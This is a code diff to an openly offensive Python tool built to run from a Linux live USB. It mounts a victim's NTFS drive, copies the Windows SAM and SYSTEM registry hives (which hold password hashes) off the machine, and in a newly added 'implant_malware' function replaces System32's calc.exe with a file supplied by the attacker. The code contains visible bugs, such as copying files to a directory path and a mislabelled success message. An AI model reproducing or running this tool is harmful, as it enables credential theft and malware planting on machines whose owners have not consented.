@@ -4,29 +4,20 @@
 # Description: Meant to be run on a linux bootable usb. Program scans for all connected storage devices and looks for specific 
 # file systems to mount and then exfils data. Only looks for NTFS and exfils the calc.exe program for now.
 
-import sys, subprocess, argparse, time
+import sys, subprocess, argparse, time, shutil
 
 class Drive:
     def __init__(self):
         self.source = ""
-        # self.target = "/mnt"
         self.fs = ""
-        # self.options = "rw"
-        
-
     def set_source(self, source):
         self.source = source
     def set_fs(self, fs):
         self.fs = fs
-
     def get_source(self):
         return self.source
-    # def get_target(self):
-    #     return self.target
     def get_fs(self):
         return self.fs
-    # def get_options(self):
-    #     return self.options
     def is_mounted(self):
         proc = subprocess.Popen("sudo mount | column -t", stdout=subprocess.PIPE, shell=True)
         (mounted_drives, err) = proc.communicate()
@@ -59,16 +50,23 @@ def mount_drive(drive):
     subprocess.Popen("sudo mount -t ntfs-3g -o nls=utf8 {} /media/windows".format(drive.get_source()), shell=True)
     time.sleep(1)
 
-def find_winpayload():
+def copy_winpayload():
     # gotta use the mount point made by mount_drive here from the user input
     # i should implement some code that suggests a drive to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
-    subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
-    subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
-    print('\t\t\t\t  Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+    try:
+        shutil.copyfile('/media/windows/Windows/System32/config/SAM', '~/Desktop')
+        shutil.copyfile('/media/windows/Windows/System32/config/SYSTEM', '~/Desktop')
+        print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+    except FileNotFoundError:
+        print('drive not exploitable')
+    
+    # subprocess.call('cp /media/windows/Windows/System32/config/SAM ~/Desktop/', shell=True)
+    # subprocess.call('cp /media/windows/Windows/System32/config/SYSTEM ~/Desktop/', shell=True)
+    
     time.sleep(1)
     subprocess.Popen("sudo umount /media/windows", shell=True)
-    print('\t\t\t\t\t\t    Drive has been unmounted from /media/windows')
+    print('Drive has been unmounted from /media/windows')
 
 def store_drives(raw_drives):
     obj_drives = []
@@ -86,14 +84,40 @@ def store_drives(raw_drives):
         obj_drives.append(temp_drive)
     return obj_drives
 
-def dump_hashes():
-    #incorporate pwdump or secretsdump.py to dump the hashes to the screen or a file
-    # mayb use pwdump if host onl8y has local hashed but use secretsdump if it is a 
-    # domain controller.
-    pass
+def list_windrives(drives):
+    drive_count = 0
+    raw_win_drives = locate_winfs(drives)
+    win_drives = store_drives(raw_win_drives)
+    #not the happiest with this code but it works
+    if len(raw_win_drives) < 1:
+        print("no exploitable drives")
+        return False
+    else:
+        print("\nConected drives using the NTFS file system.\n")
+        for drive in raw_win_drives:
+            print("[Drive {}] {}\n".format(drive_count, drive))
+            drive_count += 1
+        target = input("\n========================================================\nplease choose a drive to exploit. Note drives start at 0\n\nDrive ")
+        print("Targeting: " + raw_win_drives[int(target)])
+        mount_drive(win_drives[int(target)])
+        return True
+
+def implant_malware():
+    try:
+        #I need to implemnt something instead of hardcoding /media/windows
+        shutil.copyfile('/media/windows/Windows/System32/calc.exe', '/media/windows/Windows/System32/calc.exe.bak')
+        shutil.copyfile('/calc.exe', '/media/windows/Windows/System32/')
+        print('Sytem and Sam registry hives have been succesfully exfiltrated to ~/Desktop')
+    except FileNotFoundError:
+        print('drive not exploitable')
+
+    subprocess.Popen("sudo umount /media/windows", shell=True)
+
+    # shutil.copyfile('/calc.exe', '/media/windows/Windows/System32/')
 
 def pretty_print(drives):
     apl_drives = linux_drives =  allpurpose_drives = win_drives = []
+    subprocess.call('cat assets/ascii_art', shell=True)
     print("\n\n\t\t\t    *********************************************************************************************",end ="")
     print("\n\t\t\t    ***********************************A TABLE OF ALL CONNECTED DEVICES**************************",end ="")
     print("\n\t\t\t    *********************************************************************************************",end ="")
@@ -103,35 +127,23 @@ def pretty_print(drives):
             print("\n\t\t\t    *\t\t  {}\t\t\t{}\t\t\t   {}\t\t*".format(drive.get_source(), drive.get_fs(), drive.is_mounted()), end="")
     print("\n\t\t\t    *********************************************************************************************",end ="\n")
 
+
 def main():
 
-    subprocess.call('cat assets/ascii_art', shell=True)
     parser = argparse.ArgumentParser(description='Choose which mode to run program in. No input lists all the storage devices.')
     group = parser.add_mutually_exclusive_group()
-    group.add_argument('-w', '--exfil_win', action="store_true")
+    group.add_argument('-w', '--hives', action='store_true')
+    group.add_argument('-i', '--implant', action='store_true')
     args = parser.parse_args()
     drives = grab_drives()
     all_drives = store_drives(drives)
-    if args.exfil_win:
-        drive_count = 0
-        raw_win_drives = locate_winfs(drives)
-        win_drives = store_drives(raw_win_drives)
-        #not the happiest with this code but it works
-        if len(raw_win_drives) < 1:
-            print("no exploitable drives")
-        else:
-            print("\n\t\t\t\t\t\t    Conected drives using the NTFS file system.\n")
-            for drive in raw_win_drives:
-                if len(drive) > 69:
-                    print("\t\t\t\t\t\t\t\t     Drive {}\n\t\t\t    {}\n".format(drive_count, drive))
-                else:
-                    print("\t\t\t\t\t\t\t\t     Drive {}\n\t\t\t\t\t{}\n".format(drive_count, drive))
-                
-                drive_count += 1
-            target = input("\n\t\t\t\t\t     ========================================================\n\t\t\t\t\t     please choose a drive to exploit. Note drives start at 0\n\n\t\t\t\t\t\t\t\t     Drive ")
-            print("\t\t\t\tTargeting: " + raw_win_drives[int(target)])
-            mount_drive(win_drives[int(target)])
-            find_winpayload()
+    if args.hives:
+        if list_windrives(drives):
+            copy_winpayload()
+    elif args.implant:
+        if list_windrives(drives):
+            implant_malware()
+        
     elif not len(sys.argv) > 1:
         pretty_print(all_drives)
     else:
